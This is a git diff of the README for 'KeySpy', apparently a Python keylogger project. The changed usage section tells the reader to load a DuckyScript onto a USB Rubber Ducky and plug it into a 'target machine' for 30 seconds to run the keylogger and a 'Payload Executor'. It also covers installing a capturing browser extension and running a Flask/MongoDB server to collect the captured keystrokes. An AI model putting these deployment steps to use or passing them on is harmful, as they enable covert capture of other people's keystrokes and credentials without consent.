@@ -35,20 +35,24 @@ KeySpy is a simple Python keylogger with a web interface for viewing captured ke
    pip install -r requirements.txt
 
 ## Usage
-1. Navigate to the src directory:
-   ```bash
-   cd src
-2.  Run the `weblogger.py` script to start the keylogger and web interface:
-    ```bash
-    python weblogger.py
-3. Access the web interface in your browser by visiting `ngrok link` sent to the mail. `Change the sender and reciver mail in mailink.py`
-
-4. View the captured keystrokes in real-time on the web interface.
+   ### Rubber Ducky:
+   - Download the DuckyScript.txt and load that in USB Rubber Ducky.
+   - Connect the USB Rubber Ducky to the target machine at least 30 seconds.
+   - It will run the `Keylogger` & `Payload Executor` on that machine.
+   ### Web Extension:
+   - Open the Browser.
+   - Search this link `chrome://extensions/`.
+   - Click on `Load Unpack`.
+   - Add W3bSpy-Client folder from `./src/W3bSpy/W3bSpy-Client`
+   ### Web Interface:
+   - install Flask on the monitoring machine
+   - Navigate to this directory `./src/cl0ud/server` & open terminal on that directory.
+   - run this command `python ./weblogger.py`.
+   
 
 ## Note
-
-- Each time you rerun the `weblogger.py` script, the previous `keylogs.txt` file will be deleted, and a new one will be created to store the current session's keystrokes.
-- `Ngrok` should be installed in the computer to get the global link of the web interface 
+- create a `mongoDB Atlas` cluster and use the connection links.
+- Soon the extension will be available on the chrome store.
 
 ## Contributing
 
